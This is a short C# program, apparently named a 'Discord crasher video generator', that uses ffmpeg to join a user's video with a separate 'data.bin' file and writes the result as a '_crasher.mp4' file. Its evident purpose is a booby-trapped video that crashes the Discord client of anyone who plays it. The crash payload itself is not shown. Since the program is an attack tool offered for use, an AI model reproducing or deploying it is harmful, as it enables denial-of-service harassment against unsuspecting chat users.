using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace DiscordCrasherVideoGenerator
{
    internal class Program
    {
        private static async Task Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Please Drag & Drop your video");
                Console.ReadLine();
                Environment.Exit(-1);
            }
            await File.WriteAllTextAsync("files", $"file '{Path.GetFileName(args[0])}'\nfile data.bin");

            var process = new Process
            {
                StartInfo =
                {
                    FileName = "ffmpeg.exe",
                    Arguments = $"-loglevel quiet -f concat -i files -c copy -y {Path.GetFileNameWithoutExtension(args[0]) + "_crasher.mp4"}"
                }
            };

            process.Start();
            await process.WaitForExitAsync();
            File.Delete("files");
        }
    }
}
